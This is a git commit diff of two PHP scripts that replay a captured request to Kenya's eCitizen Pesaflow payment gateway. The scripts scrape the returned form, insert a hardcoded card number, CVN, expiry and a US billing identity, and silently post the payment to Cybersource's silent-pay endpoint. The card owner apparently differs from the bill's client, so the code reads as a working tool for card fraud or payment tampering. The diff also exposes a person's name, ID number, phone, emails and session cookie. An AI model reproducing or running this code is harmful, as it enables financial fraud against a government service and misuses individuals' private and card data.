e05dd4fa6df2d97f98b9de3adfa5e87429110b76
Warorua <waroruaalex640@gmail.com>
2025-05-15 08:57:45 +0300

    thryj

--- iframev2.1.php
+++ iframev2.1.php
@@ -1,35 +1,40 @@
 <?php
 
-$curl = curl_init();
 
-curl_setopt_array($curl, array(
-    CURLOPT_URL => 'https://pesaflow.ecitizen.go.ke/PaymentAPI/iframev2.1.php',
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_ENCODING => '',
-    CURLOPT_MAXREDIRS => 10,
-    CURLOPT_TIMEOUT => 0,
-    CURLOPT_FOLLOWLOCATION => true,
-    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-    CURLOPT_CUSTOMREQUEST => 'POST',
-    CURLOPT_POSTFIELDS => 'amountExpected=650.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR12%22)&billRefNumber=X8VJM3&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Fsuccess&clientEmail=bombardier.devs.master%40gmail.com&clientIDNumber=4917833&clientMSISDN=%2B254756754595&clientName=GODFREY%20GITAU%20NGURE&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=ODAwNTBjZjQzMWE4NzZmMjNhZDE4M2E1OTJiMzFjNGZmMzU2YTUwN2ZlOTFiMDVkMmEyMmMzOTliMDcwNzkxYQ%3D%3D&serviceID=42&clientType=1',
-    CURLOPT_HTTPHEADER => array(
-        'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
-        'sec-ch-ua-mobile: ?0',
-        'sec-ch-ua-platform: "Windows"',
-        'DNT: 1',
-        'Upgrade-Insecure-Requests: 1',
-        'Content-Type: application/x-www-form-urlencoded',
-        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
-        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Sec-Fetch-Site: cross-site',
-        'Sec-Fetch-Mode: navigate',
-        'Sec-Fetch-Dest: iframe',
-        'host: pesaflow.ecitizen.go.ke',
-        'Cookie: PHPSESSID=172.18.187.33:80~l4ntot24fij2f40frmsk3j5nq0'
-    ),
-));
 
-$response = curl_exec($curl);
+function pullData()
+{
+    $curl = curl_init();
 
-curl_close($curl);
-echo $response;
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://pesaflow.ecitizen.go.ke/PaymentAPI/iframev2.1.php',
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => 0,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'POST',
+        CURLOPT_POSTFIELDS => 'amountExpected=650.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR12%22)&billRefNumber=X8VJM3&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2FX8VJM3%2Fcallback%2Fsuccess&clientEmail=bombardier.devs.master%40gmail.com&clientIDNumber=4917833&clientMSISDN=%2B254756754595&clientName=GODFREY%20GITAU%20NGURE&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=ODAwNTBjZjQzMWE4NzZmMjNhZDE4M2E1OTJiMzFjNGZmMzU2YTUwN2ZlOTFiMDVkMmEyMmMzOTliMDcwNzkxYQ%3D%3D&serviceID=42&clientType=1',
+        CURLOPT_HTTPHEADER => array(
+            'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
+            'sec-ch-ua-mobile: ?0',
+            'sec-ch-ua-platform: "Windows"',
+            'DNT: 1',
+            'Upgrade-Insecure-Requests: 1',
+            'Content-Type: application/x-www-form-urlencoded',
+            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Sec-Fetch-Site: cross-site',
+            'Sec-Fetch-Mode: navigate',
+            'Sec-Fetch-Dest: iframe',
+            'host: pesaflow.ecitizen.go.ke',
+            'Cookie: PHPSESSID=172.18.187.33:80~l4ntot24fij2f40frmsk3j5nq0'
+        ),
+    ));
+
+    $response = curl_exec($curl);
+
+    curl_close($curl);
+    return $response;
+}
--- simulator.php
+++ simulator.php
@@ -1,74 +1,87 @@
 <?php
+include './iframev2.1.php';
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    echo "<h2>📩 Captured POST from Cybersource to override_custom_receipt_page</h2>";
-    echo "<pre>" . print_r($_POST, true) . "</pre>";
-    exit;
+function extract_input_fields_with_values($html)
+{
+    $doc = new DOMDocument();
+    libxml_use_internal_errors(true);
+    $doc->loadHTML($html);
+    libxml_clear_errors();
+
+    $xpath = new DOMXPath($doc);
+    $fields = [];
+
+    // Extract all input fields that have name and a non-empty value
+    $inputs = $xpath->query('//form[@id="moodleform4"]//input[@name]');
+    foreach ($inputs as $input) {
+        if ($input instanceof DOMElement) {
+            $name = $input->getAttribute('name');
+            $value = $input->getAttribute('value');
+            if (trim($value) !== '') {
+                $fields[$name] = $value;
+            }
+        }
+    }
+
+    return $fields;
 }
 
-?>
+function post_to_cybersource($url, $fields)
+{
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // stop before redirect
+    $response = curl_exec($ch);
+    curl_close($ch);
+    return $response;
+}
 
+function extract_post_to_ipn($html)
+{
+    preg_match_all('/name=\"(.*?)\" value=\"(.*?)\"/', $html, $matches);
+    $results = [];
+    foreach ($matches[1] as $i => $key) {
+        $results[$key] = $matches[2][$i];
+    }
+    return $results;
+}
+
+$html = pullData();
+$fields = extract_input_fields_with_values($html);
+
+// Hardcode required missing fields
+$fields['card_number'] = '4246315380311140';
+$fields['card_cvn'] = '700';
+$fields['card_expiry_date'] = '09-2028';
+$fields['bill_to_address_country'] = 'US';
+$fields['bill_to_address_state'] = 'NC';
+$fields['bill_to_address_city'] = 'Wilmington';
+$fields['bill_to_address_line1'] = '433 Darlington Ave U';
+$fields['bill_to_address_postal_code'] = '28403';
+$fields['first_name'] = 'Brent';
+$fields['last_name'] = 'Seaver';
+$fields['eMonth'] = '09';
+$fields['eYear'] = '2028';
+
+// Step 1: POST to Cybersource silently
+$cybersource_response = post_to_cybersource('https://secureacceptance.cybersource.com/silent/pay', $fields);
+
+// Step 2: Simulate POST back to override_custom_receipt_page (extract form fields if possible)
+$ipn_data = extract_post_to_ipn($cybersource_response);
+
+// Display final POST body that would be sent to override_custom_receipt_page
+?>
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Cybersource Silent Pay Replay</title>
+    <meta charset="UTF-8">
+    <title>Cybersource POST Replay Result</title>
 </head>
 <body>
-<h2>🔁 Replay Cybersource Silent Pay Request Exactly as Captured</h2>
-<form method="POST" action="https://secureacceptance.cybersource.com/silent/pay">
-  <input type='hidden' name='CardNo4' value='4246 3153 8031 1140'>
-  <input type='hidden' name='access_key' value='972ae9ba01f73c56999e33ba51d7e261'>
-  <input type='hidden' name='amount' value='672.75'>
-  <input type='hidden' name='auth_trans_ref_no' value='KBLFQCU'>
-  <input type='hidden' name='bill_ref' value='X8VJM3'>
-  <input type='hidden' name='bill_to_address_city' value='Wilmington'>
-  <input type='hidden' name='bill_to_address_country' value='US'>
-  <input type='hidden' name='bill_to_address_line1' value='433 Darlington Ave U'>
-  <input type='hidden' name='bill_to_address_line2' value='+254756754595'>
-  <input type='hidden' name='bill_to_address_postal_code' value='28403'>
-  <input type='hidden' name='bill_to_address_state' value='NC'>
-  <input type='hidden' name='bill_to_email' value='bombardier.devs.master@gmail.com'>
-  <input type='hidden' name='bill_to_forename' value='Brent'>
-  <input type='hidden' name='bill_to_phone' value='+254756754595'>
-  <input type='hidden' name='bill_to_surname' value='Seaver'>
-  <input type='hidden' name='card_cvn' value='700'>
-  <input type='hidden' name='card_expiry_date' value='09-2028'>
-  <input type='hidden' name='card_number' value='4246315380311140'>
-  <input type='hidden' name='card_type' value='001'>
-  <input type='hidden' name='currency' value='KES'>
-  <input type='hidden' name='customer_ip_address' value='172.18.162.51'>
-  <input type='hidden' name='device_fingerprint_id' value='vskul9h7p58opoknpdqmrj42k7'>
-  <input type='hidden' name='eMonth' value='09'>
-  <input type='hidden' name='eYear' value='2028'>
-  <input type='hidden' name='first_name' value='Brent'>
-  <input type='hidden' name='item_0_code' value='KBLFQCU'>
-  <input type='hidden' name='item_0_name' value='KBLFQCU'>
-  <input type='hidden' name='item_0_quantity' value='1'>
-  <input type='hidden' name='item_0_sku' value='KBLFQCU'>
-  <input type='hidden' name='item_0_unit_price' value='672.75'>
-  <input type='hidden' name='last_name' value='Seaver'>
-  <input type='hidden' name='line_item_count' value='1'>
-  <input type='hidden' name='locale' value='en-us'>
-  <input type='hidden' name='merchant_defined_data1' value='MDD#1'>
-  <input type='hidden' name='merchant_defined_data2' value='MDD#2'>
-  <input type='hidden' name='merchant_defined_data3' value='MDD#3'>
-  <input type='hidden' name='merchant_defined_data4' value='https://pesaflow.ecitizen.go.ke/PaymentAPI/Wrappers/Cybersource4/ipn.php'>
-  <input type='hidden' name='merchant_descriptor' value='ECITIZEN'>
-  <input type='hidden' name='name' value='Brent Seaver'>
-  <input type='hidden' name='override_custom_receipt_page' value='https://pesaflow.ecitizen.go.ke/PaymentAPI/Wrappers/Cybersource4/ipn.php'>
-  <input type='hidden' name='payment_gateway_id' value='30'>
-  <input type='hidden' name='payment_method' value='card'>
-  <input type='hidden' name='profile_id' value='AE3F228E-9750-4C9E-96A8-709E36BB502B'>
-  <input type='hidden' name='reference_number' value='KBLFQCU'>
-  <input type='hidden' name='service_id' value='42'>
-  <input type='hidden' name='signature' value='DHGiKk5Vq8dbV+gxtN3J402A4Rp26xUq5mVoZ3BUyuI='>
-  <input type='hidden' name='signed_date_time' value='2025-05-15T03:10:00Z'>
-  <input type='hidden' name='signed_field_names' value='profile_id,access_key,transaction_uuid,signed_field_names,unsigned_field_names,signed_date_time,locale,payment_method,transaction_type,reference_number,auth_trans_ref_no,amount,currency,merchant_descriptor,override_custom_receipt_page'>
-  <input type='hidden' name='transaction_type' value='sale'>
-  <input type='hidden' name='transaction_uuid' value='X8VJM3_510'>
-  <input type='hidden' name='unsigned_field_names' value='device_fingerprint_id,card_type,card_number,card_expiry_date,card_cvn,bill_to_forename,bill_to_surname,bill_to_email,bill_to_phone,bill_to_address_line1,bill_to_address_line2,bill_to_address_city,bill_to_address_state,bill_to_address_country,bill_to_address_postal_code,customer_ip_address,line_item_count,item_0_code,item_0_sku,item_0_name,item_0_quantity,item_0_unit_price,merchant_defined_data1,merchant_defined_data2,merchant_defined_data3,merchant_defined_data4'>
-  <button type='submit'>🔁 Send POST to Cybersource</button>
-</form>
+    <h2>📦 POST Data Sent to override_custom_receipt_page</h2>
+    <pre><?php print_r($ipn_data); ?></pre>
 </body>
 </html>
